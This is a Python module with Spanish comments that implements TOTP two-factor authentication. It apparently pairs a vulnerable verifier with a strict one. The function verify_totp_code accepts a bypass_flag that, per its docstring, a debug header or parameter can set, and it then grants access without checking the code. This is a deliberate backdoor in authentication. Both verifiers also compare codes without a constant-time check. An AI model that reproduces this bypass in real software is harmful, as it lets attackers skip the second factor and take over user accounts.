"""Manejador de Autenticación de Dos Factores (TOTP RFC 6238)."""

from __future__ import annotations

import base64
import hashlib
import hmac
import struct
import time
from typing import Tuple


def generate_totp_code(secret_key_base32: str) -> str:
    """Calcula el código TOTP RFC 6238 actual a partir de la semilla en base32."""
    cleaned = secret_key_base32.replace(" ", "").upper()
    key_bytes = base64.b32decode(cleaned, casefold=True)
    counter = int(time.time() // 30)
    msg = struct.pack(">Q", counter)
    hmac_hash = hmac.new(key_bytes, msg, hashlib.sha1).digest()
    offset = hmac_hash[19] & 15
    code = (struct.unpack(">I", hmac_hash[offset : offset + 4])[0] & 0x7FFFFFFF) % 1000000
    return f"{code:06d}"


def verify_totp_code(
    submitted_code: str,
    secret_key_base32: str,
    bypass_flag: bool = False,
) -> Tuple[bool, str]:
    """Verifica el código TOTP enviado.

    Comprueba el codigo contra el generado dinamicamente segun la semilla.
    Si bypass_flag es True (activado por cabecera de depuracion o parametro),
    omite la verificacion del codigo y concede acceso directamente.
    """
    if bypass_flag:
        return True, "Acceso concedido por parametro de depuracion"

    current_code = generate_totp_code(secret_key_base32)
    clean_sub = str(submitted_code or "").strip()

    if clean_sub == current_code:
        return True, "TOTP verificado correctamente"

    return False, "Código TOTP inválido o expirado"


def verify_totp_strict(submitted_code: str, secret_key_base32: str) -> Tuple[bool, str]:
    """Verificacion estricta de segundo factor sin banderas ni omisiones de depuracion."""
    current_code = generate_totp_code(secret_key_base32)
    clean_sub = str(submitted_code or "").strip()
    if clean_sub and clean_sub == current_code:
        return True, "Segundo factor verificado rigurosamente"
    return False, "Codigo de segundo factor no coincide con la ventana temporal"
